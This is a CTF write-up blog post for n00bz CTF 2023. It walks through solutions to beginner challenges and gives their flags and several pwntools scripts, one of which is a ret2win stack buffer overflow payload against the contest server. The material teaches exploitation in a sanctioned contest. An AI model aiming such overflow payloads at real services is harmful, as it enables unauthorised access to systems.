<!doctype html><html lang="en"
   data-mode="dark">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>n00bz CTF 2023 | xorc1ph3r&#39;s Blog</title><link rel="apple-touch-icon" href="https://x0rc1ph3r.github.io/images/favicons/apple-touch-icon.png" sizes="180x180">
<link rel="icon" href="https://x0rc1ph3r.github.io/images/favicons/favicon-32x32.png" sizes="32x32" type="image/png">
<link rel="icon" href="https://x0rc1ph3r.github.io/images/favicons/favicon-16x16.png" sizes="16x16" type="image/png">
<link rel="manifest" href="https://x0rc1ph3r.github.io/images/favicons/manifest.json">
<link rel="icon" href="https://x0rc1ph3r.github.io/images/favicons/favicon.ico">
<meta name="keywords" content="" />
<meta name="description" content=" My approch towards the CTF challenges " />

<meta itemprop="name" content="n00bz CTF 2023">
<meta itemprop="description" content=" My approach towards the CTF challenges "><meta itemprop="datePublished" content="2022-08-17T07:34:48+08:30" />
<meta itemprop="dateModified" content="2022-08-17T07:34:48+08:30" />
<meta itemprop="wordCount" content="41"><meta itemprop="image" content='https://x0rc1ph3r.github.io/posts/n00bz2023/images/_card.png'>
<meta itemprop="keywords" content="Misc," /><meta property="og:title" content="n00bz CTF 2023" />
<meta property="og:description" content=" My approach towards the CTF challenges " />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://x0rc1ph3r.github.io/posts/n00bz2023/" /><meta property="og:image" content='https://x0rc1ph3r.github.io/posts/n00bz2023/images/_card.png' /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-08-17T07:34:48+08:30" />
<meta property="article:modified_time" content="2022-08-17T07:34:48+08:30" />
<meta name="twitter:card" content="summary"/>
<meta name="twitter:image" content='https://x0rc1ph3r.github.io/posts/n00bz2023/images/_card.png'/>

<meta name="twitter:title" content="n00bz CTF 2023"/>
<meta name="twitter:description" content=" My approach towards the CTF challaenges "/>
<meta name="twitter:site" content="@farmansk"/>
<link rel="preload" href="https://x0rc1ph3r.github.io/css/bundle.min.fcd024e77e7ca8dc30926e1b5389582b45bdb44482ee20d1ae3aae2c00de9817.css" integrity="sha256-/NAk5358qNwwkm4bU4lYK0W9tESC7iDRrjquLADemBc=" crossorigin="anonymous" as="style" onload="this.rel='stylesheet'">
<noscript><link rel="stylesheet" href="https://x0rc1ph3r.github.io/css/bundle.min.fcd024e77e7ca8dc30926e1b5389582b45bdb44482ee20d1ae3aae2c00de9817.css" integrity="sha256-/NAk5358qNwwkm4bU4lYK0W9tESC7iDRrjquLADemBc=" crossorigin="anonymous"></noscript><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Consolas" type="text/css" media="all" referrerpolicy="no-referrer" />
<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Fira+Code" type="text/css" media="all" />
<style>
 body { font-family: 'Consolas'; }
 code { font-family: 'Fira Code'; }
 code { tab-size: 4; }
</style></head>
  <body><script src="https://x0rc1ph3r.github.io/js/bootstrap.min.062c2e66b557cb779d59cedff7e0cc76e84beb665a1076e474e87d940be44245.js" integrity="sha256-BiwuZrVXy3edWc7f9&#43;DMduhL62ZaEHbkdOh9lAvkQkU=" crossorigin="anonymous"></script><header><nav class="navbar top-app-bar top-app-bar-expand-lg fixed-top">
  <div class="container">
    <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent"
      aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <i class="fas fa-bars"></i>
    </button><a class="navbar-brand me-3" href="https://x0rc1ph3r.github.io/">x0rc1ph3r&#39;s Blog
    </a>
    <button class="navbar-social-share" type="button" data-bs-toggle="offcanvas" data-bs-target="#offcanvasSocialShare"
  aria-controls="offcanvasSocialShare" aria-label="Toggle social share">
  <i class="fas fa-share-alt"></i>
</button>

<div class="offcanvas offcanvas-bottom surface" tabindex="-1" id="offcanvasSocialShare" aria-labelledby="offcanvasSocialShare">
  <div class="offcanvas-header">
    <h3 class="offcanvas-title">Share</h3>
    <button type="button" class="btn btn-sm btn-outline-primary" data-bs-dismiss="offcanvas" aria-label="Close">
      <i class="fas fa-times"></i>
    </button>
  </div>
  <div class="offcanvas-body">
    <a class="btn btn-sm btn-outline-primary social-share-button" rel="noopener noreferrer" aria-label="Twitter Share Button"
      target="_blank" href="https://twitter.com/intent/tweet?title=n00bz%20CTF%202023&url=https%3a%2f%2fx0rc1ph3r.github.io%2fposts%2fn00bz2023%2f">
      <i class="fab fa-fw fa-twitter"></i> Twitter
    </a>
    <a class="btn btn-sm btn-outline-primary social-share-button" rel="noopener noreferrer" aria-label="Facebook Share Button"
      target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2fx0rc1ph3r.github.io%2fposts%2fn00bz2023%2f">
      <i class="fab fa-fw fa-facebook-f"></i> Facebook
    </a>
  </div>
</div>
    <button class="navbar-settings" type="button" data-bs-toggle="offcanvas" data-bs-target="#offcanvasSettings"
  aria-controls="offcanvasSettings" aria-label="Toggle settings">
  <i class="fas fa-ellipsis-v"></i>
</button>

<div class="offcanvas offcanvas-end surface h-100" tabindex="-1" id="offcanvasSettings" aria-labelledby="offcanvasSettings">
  <div class="offcanvas-header">
    <h3 class="offcanvas-title">Settings</h3>
    <button type="button" class="btn btn-sm btn-outline-primary" data-bs-dismiss="offcanvas" aria-label="Close">
      <i class="fas fa-times"></i>
    </button>
  </div>
  <div class="offcanvas-body">



<section class="setting">
  <form class="font-size-switcher-form row">
    <div class="col-auto">
      <label for="fontSize" class="form-label"><i class="fas fa-fw fa-font"></i> Font Size</label>
    </div>
    <div class="col-auto ms-auto">
      <input type="range" class="form-range" min="-2" max="2" id="fontSize">
    </div>
  </form>
</section>


<section class="setting palettes">
  <form class="row">
    <div class="col-auto">
      <label><i class="fas fa-fw fa-palette"></i> Palette</label>
    </div>
    <div class="col-auto ms-auto">
      <a id="btnPalette" class="btn btn-sm btn-outline-primary" role="button" aria-label="palettePicker">
        <i class="fas fa-eye-dropper"></i>
      </a>
    </div>
  </form>
  <div class="mt-2 d-flex visually-hidden" id="palettePicker"><button type="button" id="palette-blue" aria-label="Blue"
        class="btn btn-sm palette" data-palette="blue">
      </button><button type="button" id="palette-blue-gray" aria-label="Blue Gray"
        class="btn btn-sm palette" data-palette="blue-gray">
      </button><button type="button" id="palette-brown" aria-label="Brown"
        class="btn btn-sm palette" data-palette="brown">
      </button><button type="button" id="palette-cyan" aria-label="Cyan"
        class="btn btn-sm palette" data-palette="cyan">
      </button><button type="button" id="palette-green" aria-label="Green"
        class="btn btn-sm palette" data-palette="green">
      </button><button type="button" id="palette-indigo" aria-label="Indigo"
        class="btn btn-sm palette" data-palette="indigo">
      </button><button type="button" id="palette-orange" aria-label="Orange"
        class="btn btn-sm palette" data-palette="orange">
      </button><button type="button" id="palette-pink" aria-label="Pink"
        class="btn btn-sm palette" data-palette="pink">
      </button><button type="button" id="palette-purple" aria-label="Purple"
        class="btn btn-sm palette" data-palette="purple">
      </button><button type="button" id="palette-red" aria-label="Red"
        class="btn btn-sm palette" data-palette="red">
      </button><button type="button" id="palette-teal" aria-label="Teal"
        class="btn btn-sm palette" data-palette="teal">
      </button><button type="button" id="palette-yellow" aria-label="Yellow"
        class="btn btn-sm palette" data-palette="yellow">
      </button></div>
</section>
</div>
</div>

    <div class="collapse navbar-collapse" tabindex="-1" id="navbarSupportedContent" aria-labelledby="navbarSupportedContent">
      
      <ul class="navbar-nav ms-auto"><li class="nav-item">
          <a class="nav-link" href="https://x0rc1ph3r.github.io/archives/">
            <i class="fas fa-fw fa-file-archive"></i>Archives
          </a>
        </li><li class="nav-item">
          <a class="nav-link" href="https://x0rc1ph3r.github.io/categories/">
            <i class="fas fa-fw fa-folder"></i>Categories
          </a>
        </li><li class="nav-item">
          <a class="nav-link" href="https://x0rc1ph3r.github.io/tags/">
            <i class="fas fa-fw fa-tags"></i>Tags
          </a>
        </li><li class="nav-item">
          <a class="nav-link" href="https://x0rc1ph3r.github.io/series/">
            <i class="fas fa-fw fa-columns"></i>Series
          </a>
        </li></ul>
    </div>
  </div>
</nav>
</header>
<main role="main" class="container">
      <div class="row content">
<div class="col-lg-8">
  <div class="container"><nav class="row card component" aria-label="breadcrumb">
  <div class="card-body">
    <ol class="breadcrumb "><li class="breadcrumb-item"><a href="https://x0rc1ph3r.github.io/">Home</a></li><li class="breadcrumb-item"><a href="https://x0rc1ph3r.github.io/posts/">Posts</a></li><li class="breadcrumb-item active">n00bz CTF 2023</li></ol>
  </div>
</nav>    <article class="row card component mb-4 post"><div class="post-panel-wrapper">
  <div class="d-flex flex-column component rounded post-panel">
    
    <a id="sidebarToggler" class="action d-none d-lg-block" role="button">
  <i class="fas fa-fw fa-expand-alt" data-fa-transform="rotate-45"></i>
</a>
  
    

    
    
    
    
  </div>
</div>
<div class="card-body">
        <h1 class="card-title my-3">n00bz CTF 2023
</h1><div class="post-meta"><span class="post-date" title="created on">
    <i class="fas fa-fw fa-calendar-alt"></i>Jun 13, 2023
  </span><span class="post-reading-time" title="reading time">
    <i class="fas fa-fw fa-coffee"></i>10 min read
  </span><a href="https://x0rc1ph3r.github.io/categories/ctf/" class="badge rounded-pill text-white bg-primary post-taxonomy">CTF</a><a href="https://x0rc1ph3r.github.io/categories/writeups/" class="badge rounded-pill text-white bg-primary post-taxonomy">WriteUps</a><a href="https://x0rc1ph3r.github.io/categories/security/" class="badge rounded-pill text-white bg-primary post-taxonomy">Security</a><a href="https://x0rc1ph3r.github.io/tags/misc/" class="badge rounded-pill text-white bg-primary post-taxonomy">Misc</a></div>
<p class="post-content mb-3"><p>Sup?!</p>
<p>Hey, there! This time, I’m back with n00bz CTF. I played this CTF along with Invaders0x1 team.
I managed to solve a variety of challenges from various categories.</p>
<h3>Misc</h3>
<h5>Amazing Song Lyrics</h5>
<p>This challenge had given a image with American Sign Language.</p>
<img class=img-fluid alt="n00bz CTF 2023" src=https://x0rc1ph3r.github.io/posts/n00bz2023/images/misc/misc1.png loading=lazy width=400 height=400>
<p>I used decode.fr website to recover the flag.</p>
<img class=img-fluid alt="n00bz CTF 2023" src=https://x0rc1ph3r.github.io/posts/n00bz2023/images/misc/misc1sc.png loading=lazy width=955 height=382>
<p>n00bz{americansignlanguagedecoded}</p>

<h5>My Chemical Romance</h5>
<img class=img-fluid alt="n00bz CTF 2023" src=https://x0rc1ph3r.github.io/posts/n00bz2023/images/misc/misc2.png loading=lazy width=400 height=400>
<p>This challenge is a periodic table cipher.
18 - Argon (Ar)
68 - Erbium (Er)
08 - Oxygen (O)
15 - Phosphorus (P)
57 - Lanthanum (La)
10 - Neon (Ne)
</p><p>n00bz{aeroplane}</p>

<h5>Numbers</h5>
<img class=img-fluid alt="n00bz CTF 2023" src=https://x0rc1ph3r.github.io/posts/n00bz2023/images/misc/misc3.png loading=lazy width=400 height=400>
<p>This challenge is a netcat based challenge that asks 100 rounds like above question. I have written a code to automate the process.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py">
<span class="line"><span class="kn">from</span> <span class="n">pwn</span> <span class="k">import</span> <span class="o">*</span></span>
<span class="line"><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">"challs.n00bzunit3d.xyz"</span><span class="p">,</span> <span class="mi">13541</span><span class="p">)</span></span>
<span class="line"></span>
<span class="line"><span class="k">def</span> <span class="n">count_nums</span><span class="p">(</span><span class="n">dig</span><span class="p">,</span> <span class="n">n</span><span class="p">):</span></span>
<span class="line">    <span class="n">count</span> <span class="o">=</span> <span class="mi">0</span></span>
<span class="line">    <span class="k">for</span> <span class="n">num</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">n</span><span class="p">):</span></span>
<span class="line">        <span class="n">count</span> <span class="o">+=</span> <span class="nb">str</span><span class="p">(</span><span class="n">num</span><span class="p">).</span><span class="n">count</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">dig</span><span class="p">))</span></span>
<span class="line">    <span class="k">return</span> <span class="n">count</span></span>
<span class="line"></span>
<span class="line"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span></span>
<span class="line">    <span class="k">try</span><span class="p">:</span></span>
<span class="line">        <span class="nb">print</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">())</span></span>
<span class="line">        <span class="n">out</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">decode</span><span class="p">().</span><span class="n">split</span><span class="p">(</span><span class="s1">" "</span><span class="p">)</span></span>
<span class="line">        <span class="nb">print</span><span class="p">(</span><span class="n">out</span><span class="p">)</span></span>
<span class="line">        <span class="n">i</span><span class="p">,</span> <span class="n">n</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">out</span><span class="p">[</span><span class="mi">2</span><span class="p">].</span><span class="n">rstrip</span><span class="p">(</span><span class="s1">'\'s'</span><span class="p">)),</span> <span class="nb">int</span><span class="p">(</span><span class="n">out</span><span class="p">[</span><span class="mi">5</span><span class="p">].</span><span class="n">rstrip</span><span class="p">(</span><span class="s1">'?\n'</span><span class="p">))</span></span>
<span class="line">        <span class="nb">print</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span></span>
<span class="line">        <span class="n">to_send</span> <span class="o">=</span> <span class="n">count_nums</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span></span>
<span class="line">        <span class="nb">print</span><span class="p">(</span><span class="n">to_send</span><span class="p">)</span></span>
<span class="line">        <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">to_send</span><span class="p">))</span></span>
<span class="line">        <span class="nb">print</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">())</span></span>
<span class="line">    <span class="k">except</span> <span class="n">EOFError</span><span class="p">:</span></span>
<span class="line">        <span class="n">exit</span><span class="p">()</span></span>
</code></pre></div>
<p>n00bz{4n_345y_pr0gr4mm1ng_ch4ll}</p>

<h3>Forensics</h3>
<h5>Hecked</h5>
<img class=img-fluid alt="n00bz CTF 2023" src=https://x0rc1ph3r.github.io/posts/n00bz2023/images/forensics/foren1.png loading=lazy width=400 height=500>
<p>This challenge provided a pcap file, which on inspection with WireShark, helped me to get the flag.</p>
<img class=img-fluid alt="n00bz CTF 2023" src=https://x0rc1ph3r.github.io/posts/n00bz2023/images/forensics/foren1sc1.png loading=lazy>
<img class=img-fluid alt="n00bz CTF 2023" src=https://x0rc1ph3r.github.io/posts/n00bz2023/images/forensics/foren1sc2.png loading=lazy>
<p>I used these details and converted them to md5 sum.</p>
<img class=img-fluid alt="n00bz CTF 2023" src=https://x0rc1ph3r.github.io/posts/n00bz2023/images/forensics/md5sum.png loading=lazy>
<p>n00bz{a806fef72a92508b7a64776bb83ad4cb}</p>

<h5>LSB</h5>
<p>This challenge provided a wav file. The challenge name LSB refers to Least Significant Bit. I referred to this <a href="https://github.com/ragibson/Steganography#WavSteg">https://github.com/ragibson/Steganography#WavSteg</a> for the tools and commands and finally got the flag.</p>
<img class=img-fluid alt="n00bz CTF 2023" src=./images/forensics/cmds.png loading=lazy>
<p>n00bz{L5B_1n_w4v_f1l3s?!!!}</p>

<h5>BeepBop</h5>
<p>This challenge provided a wav file. The name BeepBop sounds like a challenge related to sound. So I tried using MMSSTV and succeeded.</p>
<img class=img-fluid alt="n00bz CTF 2023" src=./images/forensics/foren3.png loading=lazy>
<p>n00bz{beep_bop_you_found_me!}</p>

<h3>OSINT</h3>
<h5>Mission Moon</h5>
<img class=img-fluid alt="n00bz CTF 2023" src=./images/osint/sc.png loading=lazy height="500" width="400">
<p>I immediately guessed that it is Chandrayaan 2 by looking at the image and looked for the latitude and longitude.</p>
<p>n00bz{Vikram_Pragyan_70.9_22.8}</p>

<h3>Rev</h3>
<h5>Welcome</h5>
<p>This challenged provided a ELF file. By looking at the title, I ran strings hoping to get the flag and done.</p>
<img class=img-fluid alt="n00bz CTF 2023" src=./images/rev/sc.png loading=lazy>
<p>n00bz{N3v3R_$torE_$ENs1TIV3_1nFOrMa7IOn_P1aiNtexT_In_yoUr_bin4rI3S!!!!!}</p>

<h3>Web</h3>
<h5>Club_N00b</h5>
<p>Looking at the web page,</p>
<img class=img-fluid alt="n00bz CTF 2023" src=./images/web/web1sc1.png loading=lazy width=955 height=382>
<p>The word 'radical' was highlighted</p>
<img class=img-fluid alt="n00bz CTF 2023" src=./images/web/web1sc2.png loading=lazy width=955 height=382>
<p>When clicked on the check status button, it navigated to /check?secret_phrase=nope. So I replaced 'nope' with 'radical'.</p>
<img class=img-fluid alt="n00bz CTF 2023" src=./images/web/web1sc3.png loading=lazy width=955 height=382>
<p>n00bz{see_you_in_the_club_acting_real_nice}</p>

<h5>Robots</h5>
<p>As the name suggests, the flag was in /robots.txt.</p>
<img class=img-fluid alt="n00bz CTF 2023" src=./images/web/web2sc.png loading=lazy width=955 height=382>
<p>n00bz{1_f0und_7h3_r0b0ts!}</p>

<h5>Secret Group</h5>
<p>It was a challenge requiring to change headers.</p>
<img class=img-fluid alt="n00bz CTF 2023" src=./images/web/web3sc1.png loading=lazy width=955 height=382>
<p>I followed the response to get the flag.</p>
<img class=img-fluid alt="n00bz CTF 2023" src=./images/web/web3sc2.png loading=lazy width=955 height=382>
<p>n00bz{y0u_4r3_n0w_4_v4l1d_m3mb3r_0f_th3_s3cr3t_gr0up!}</p>

<h3>Pwn</h3>
<h5>Flag Shop</h5>
<p>It was a basic integer overflow challenge on netcat.</p>
<img class=img-fluid alt="n00bz CTF 2023" src=./images/pwn/flagshop.png loading=lazy>
<p>n00bz{5h0p_g0t_h3ck3d_4nd_fl4g_g0t_570l3n!}</p>

<h5>Pwn1</h5>
<p>This challenge provided a ELF file. It was using netcat. After analyzing the ELF file, I found that it was a ret2win chall. So if you know you can overflow in a stack buffer of size x and there are no other locals, the offset to the return address is x+8. Here the array size was 64. So the offset should be 72 chars long. I found the address of the win() function from Ghidra and wrote the following script.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py">
<span class="line"><span class="kn">from</span> <span class="n">pwn</span> <span class="k">import</span> <span class="o">*</span></span>
<span class="line"><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">"challs.n00bzunit3d.xyz"</span><span class="p">,</span> <span class="mi">35932</span><span class="p">)</span></span>
<span class="line"><span class="nb">print</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">())</span></span>
<span class="line"><span class="n">payload</span> <span class="o">=</span> <span class="nb">b'A'</span><span class="o">*</span><span class="mi">72</span> <span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0x0040124a</span><span class="p">)</span></span>
<span class="line"><span class="nb">print</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span></span>
<span class="line"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span></span>
<span class="line"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span>
</code></pre></div>
<p>After executing this python file, It gave access to the terminal. From there, I got the flag.</p>
<img class=img-fluid alt="n00bz CTF 2023" src=./images/pwn/pwn1.png loading=lazy>
<p>n00bz{PWN_1_Cl34r3d_n0w_0nt0_PWN_2!!!}</p>

<h3>Crypto</h3>
<h5>MaaS</h5>
<p>This challenge provided a python file running on netcat.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py">
<span class="line"><span class="kn">import</span> <span class="n">random</span></span>
<span class="line"><span class="kn">from</span> <span class="n">Crypto</span><span class="o">.</span><span class="n">Util</span><span class="o">.</span><span class="n">number</span> <span class="kn">import</span> <span class="o">*</span></span>
<span class="line"><span class="n">flag</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">'flag.txt'</span><span class="p">).</span><span class="n">read</span><span class="p">()</span></span>
<span class="line"><span class="n">alpha</span> <span class="o">=</span> <span class="s1">'abcdefghijklmnopqrstuvwxyz'</span><span class="o">.</span><span class="n">upper</span><span class="p">()</span></span>
<span class="line"><span class="n">to_guess</span> <span class="o">=</span> <span class="s1">''</span></span>
<span class="line"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">16</span><span class="p">):</span></span>
<span class="line">    <span class="n">to_guess</span> <span class="o">+=</span> <span class="n">random</span><span class="o">.</span><span class="n">choice</span><span class="p">(</span><span class="n">alpha</span><span class="p">)</span></span>
<span class="line"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">to_guess</span><span class="p">)):</span></span>
<span class="line">    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">3</span><span class="p">):</span></span>
<span class="line">        <span class="nb">print</span><span class="p">(</span><span class="n">to_guess</span><span class="p">)</span></span>
<span class="line">        <span class="n">inp</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="s1">f'Guessing letter {i}, Enter Guess: '</span><span class="p">))</span></span>
<span class="line">        <span class="n">guess</span> <span class="o">=</span> <span class="n">inp</span> <span class="o">&lt;&lt;</span> <span class="mi">16</span></span>
<span class="line">        <span class="nb">print</span><span class="p">(</span><span class="n">guess</span> <span class="o">%</span> <span class="nb">ord</span><span class="p">(</span><span class="n">to_guess</span><span class="p">[</span><span class="n">i</span><span class="p">]))</span></span>
<span class="line"><span class="n">last_guess</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s1">'Enter Guess: '</span><span class="p">)</span></span>
<span class="line"><span class="k">if</span> <span class="n">last_guess</span> <span class="o">==</span> <span class="n">to_guess</span><span class="p">:</span></span>
<span class="line">    <span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span></span>
<span class="line"><span class="k">else</span><span class="p">:</span></span>
<span class="line">    <span class="nb">print</span><span class="p">(</span><span class="s1">'Incorrect! Bye!'</span><span class="p">)</span></span>
<span class="line">    <span class="nb">exit</span><span class="p">()</span>
</code></pre></div>
<p>After reading the script, I understood that there are three chances to guess each alphabet. So I chose 3 numbers 2, 5, 17 for each trail for each alphabet. I stored the possible values for 2, 5, 17 in three different arrays and took the common element. I automated this whole process.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py">
  <span class="line"><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span></span>
  <span class="line"></span>
  <span class="line"><span class="n">host</span><span class="p">,</span> <span class="n">port</span> <span class="o">=</span> <span class="s1">"challs.n00bzunit3d.xyz"</span><span class="p">,</span> <span class="mi">51081</span></span>
  <span class="line"></span>
  <span class="line"><span class="n">final</span> <span class="o">=</span> <span class="p">[]</span>
  <span class="line"><span class="n">final2</span> <span class="o">=</span> <span class="p">[]</span></span>
  <span class="line"></span>
  <span class="line"><span class="k">def</span> <span class="n">IntersecOfSets</span><span class="p">(</span><span class="n">arr1</span><span class="p">,</span> <span class="n">arr2</span><span class="p">,</span> <span class="n">arr3</span><span class="p">):</span></span>
  <span class="line">    <span class="c1"># Converting the arrays into sets</span></span>
  <span class="line">    <span class="n">s1</span> <span class="o">=</span> <span class="nb">set</span><span class="p">(</span><span class="n">arr1</span><span class="p">)</span></span>
  <span class="line">    <span class="n">s2</span> <span class="o">=</span> <span class="nb">set</span><span class="p">(</span><span class="n">arr2</span><span class="p">)</span></span>
  <span class="line">    <span class="n">s3</span> <span class="o">=</span> <span class="nb">set</span><span class="p">(</span><span class="n">arr3</span><span class="p">)</span></span>
  <span class="line">    </span>
  <span class="line">    <span class="c1"># Calculates intersection of</span></span>
  <span class="line">    <span class="c1"># sets on s1 and s2</span></span>
  <span class="line">    <span class="n">set1</span> <span class="o">=</span> <span class="n">s1</span><span class="o">.</span><span class="n">intersection</span><span class="p">(</span><span class="n">s2</span><span class="p">)</span>         <span class="c1">#[80, 20, 100]</span></span>
  <span class="line">    </span>
  <span class="line">    <span class="c1"># Calculates intersection of sets</span></span>
  <span class="line">    <span class="c1"># on set1 and s3</span></span>
  <span class="line">    <span class="n">result_set</span> <span class="o">=</span> <span class="n">set1</span><span class="o">.</span><span class="n">intersection</span><span class="p">(</span><span class="n">s3</span><span class="p">)</span>   </span>
  <span class="line">    </span>
  <span class="line">    <span class="c1"># Converts resulting set to list</span></span>
  <span class="line">    <span class="n">final_list</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">result_set</span><span class="p">)</span></span>
  <span class="line">    <span class="n">final</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">final_list</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span></span>
  <span class="line">    <span class="n">final2</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">final_list</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span></span>
  <span class="line"></span>
  <span class="line"><span class="k">def</span> <span class="n">calc</span><span class="p">(</span><span class="n">inp</span><span class="p">,</span> <span class="n">out</span><span class="p">):</span></span>
  <span class="line">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">65</span><span class="p">,</span> <span class="mi">91</span><span class="p">):</span></span>
  <span class="line">        <span class="k">if</span><span class="p">(</span><span class="p">(</span><span class="n">inp</span><span class="o">&lt;&lt;</span><span class="mi">16</span><span class="p">)</span> <span class="o">%</span> <span class="n">i</span><span class="p">)</span> <span class="o">==</span> <span class="n">out</span><span class="p">:</span></span>
  <span class="line">            <span class="k">if</span> <span class="n">inp</span> <span class="o">==</span> <span class="mi">2</span><span class="p">:</span></span>
  <span class="line">                <span class="n">arr1</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">i</span><span class="p">)</span></span>
  <span class="line">            <span class="k">elif</span> <span class="n">inp</span> <span class="o">==</span> <span class="mi">5</span><span class="p">:</span></span>
  <span class="line">                <span class="n">arr2</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">i</span><span class="p">)</span></span>
  <span class="line">            <span class="k">else</span><span class="p">:</span></span>
  <span class="line">                <span class="n">arr3</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">i</span><span class="p">)</span></span>
  <span class="line"></span>
  <span class="line"><span class="n">input</span> <span class="o">=</span> <span class="p">[</span><span class="s1">'2'</span><span class="p">,</span> <span class="s1">'5'</span><span class="p">,</span> <span class="s1">'17'</span><span class="p">]</span></span>
  <span class="line"><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span></span>
  <span class="line"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">16</span><span class="p">):</span></span>
  <span class="line">    <span class="n">arr1</span> <span class="o">=</span> <span class="p">[]</span>
  <span class="line">    <span class="n">arr2</span> <span class="o">=</span> <span class="p">[]</span>
  <span class="line">    <span class="n">arr3</span> <span class="o">=</span> <span class="p">[]</span>
  <span class="line">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">input</span><span class="p">:</span></span>
  <span class="line">        <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">i</span><span class="p">)</span></span>
  <span class="line">        <span class="n">output</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">decode</span><span class="p">().</span><span class="n">split</span><span class="p">(</span><span class="s1">" "</span><span class="p">)[</span><span class="mi">5</span><span class="p">])</span></span>
  <span class="line">        <span class="nb">print</span><span class="p">(</span><span class="n">output</span><span class="p">)</span></span>
  <span class="line">        <span class="n">calc</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">i</span><span class="p">),</span> <span class="n">output</span><span class="p">)</span></span>
  <span class="line">    <span class="n">IntersecOfSets</span><span class="p">(</span><span class="n">arr1</span><span class="p">,</span> <span class="n">arr2</span><span class="p">,</span> <span class="n">arr3</span><span class="p">)</span>
  <span class="line">    <span class="nb">print</span><span class="p">(</span><span class="n">arr1</span><span class="p">,</span> <span class="n">arr2</span><span class="p">,</span> <span class="n">arr3</span><span class="p">,</span> <span class="n">final</span><span class="p">,</span> <span class="n">final2</span><span class="p">)</span></span>
  <span class="line"></span>
  <span class="line"><span class="k">if</span> <span class="n">final</span> <span class="o">==</span> <span class="n">final2</span><span class="p">:</span></span>
  <span class="line">    <span class="nb">print</span><span class="p">(</span><span class="n">final</span><span class="p">)</span></span>
  <span class="line">    <span class="n">flag</span> <span class="o">=</span> <span class="s1">''</span></span>
  <span class="line">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">final</span><span class="p">:</span></span>
  <span class="line">        <span class="n">flag</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span></span>
  <span class="line">    <span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span></span>
  <span class="line">    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span></span>
  <span class="line">    <span class="n">result</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span></span>
  <span class="line">    <span class="nb">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span></span>
</code></pre></div>
